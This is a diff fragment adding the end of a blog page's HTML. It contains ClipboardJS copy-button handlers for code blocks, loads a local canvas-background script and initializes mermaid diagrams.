+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
